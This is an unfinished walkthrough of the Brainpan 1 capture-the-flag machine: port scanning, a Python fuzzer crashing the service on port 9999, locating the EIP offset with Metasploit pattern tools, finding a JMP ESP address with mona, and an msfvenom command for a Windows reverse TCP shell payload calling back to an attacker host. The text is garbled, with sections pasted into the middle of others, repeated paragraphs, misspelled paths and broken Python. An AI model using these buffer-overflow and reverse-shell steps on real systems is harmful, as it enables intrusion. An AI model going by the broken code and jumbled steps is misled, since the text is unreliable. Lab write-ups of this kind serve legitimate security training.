# Brainpan 1 Walkthrough
Following is the outcome of my hacking handiwork

## 1. Initial Scan

`nmap -sV -sT -v -p- -T4 192.168.56.1/24`

```
Scanning 192.168.56.106 [65535 ports]
Discovered open port 9999/tcp on 192.168.56.106
Completed Connect Scan at 14:46, 2.04s elapsed (65535 total ports)
Initiating Service scan at 14:46
Scanning 1 service on 192.168.57.1
Completed Service scan at 14:46, 6.13s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 192.168.57.1
NSE: Script scanning 192.168.57.1.
Initiating NSE at 14:46
Completed NSE at 14:46, 0.01s elapsed
Initiating NSE at 14:46
Completed NSE at 14:46, 0.01s elapsed
Nmap scan report for 192.168.57.1
Host is up (0.000064s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE VERSION
9999/tcp open  abyss?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=3/4%Time=5E5FB12A%P=x86_64-pc-linux-gnu%r(NUL
SF:L,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\
SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x
SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2
SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2
SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2
SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2
SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2
SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\x2
SF:0_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\x2
SF:0THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Uptime guess: 8.367 days (since Tue Feb 25 05:58:00 2020)
Network Distance: 0 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
```
![](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/nmap-scan)

`nikto -h 192.168.56.106`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/nikto.png)

`192.168.56.106:10000/bin/`

Let's download the .exe file and have the look with `strings`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan/img/strings.png)

Here, the Windows IP address given by DHCP is '192.168.56.105'. Use the script above and see what the program spits out.
It turns out that the overflow occurs around(/with circa) 900 A's.

![sending A's](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/sending-A's.png)

Stack addresses EAX EIP ESP

`ruby /usr/share/metasploit-framwerok/tools/exploit/pattern_create.rb -l 900`

Generated pattern:
`# Brainpan 1 Walkthrough
Following is the outcome of my hacking handiwork


## 2. Fuzzing

```
import socket

for i in range(30):
  s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
  s.connect(("192.168.56.105",9999)
  payloaod = int(i)*("A"*100)
  s.send(payload+"\r\n")
  print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
  s.close()
```
Here, the Windows IP address given by DHCP is '192.168.56.105'. Use the script above and see what the program spits out.
It turns out that the overflow occurs around(/with circa) 900 A's.

![sending A's](https://github.com/d15rup7or/Labs/blob/master/Brainpan/img/sending-A's.png)

Stack addresses EAX EIP ESP

`ruby /usr/share/metasploit-framwerok/tools/exploit/pattern_create.rb -l 900`

!(pattern_create)[]

And we insert the output from above into the fuzzing script

`Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9...`

After executing it (.py script) we see the following output containing `Access violation`:

The EIP was overwritten with .....

`ruby pattern_offset.rb 35724134`

Setting JMP ESP address and shellcode


!(pattern_create)[]


And we insert the output from above into the fuzzing script

`aaa`

After executing it (.py script) we see the following output containing `Access violation`:

The EIP was overwritten with .....

`ruby pattern_offset.rb -q 35724134`
|
|
`[*] Exact match at offset 524`

Exactly 524 bytes of 'crash' is needed in order to get us to EIP. Time to edit our fuzzer and see if we can overwrite eip with some B's (/x42). 

Setting JMP ESP address and shellcode

`!mona jump -r ESP`

`0x31170000` <- no ASLR

`msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport 443 -f c -o shellcode.txt -b "\x00"`
## Conclusion and benefits
It was an opportunity to improve
- scripting skills
- 
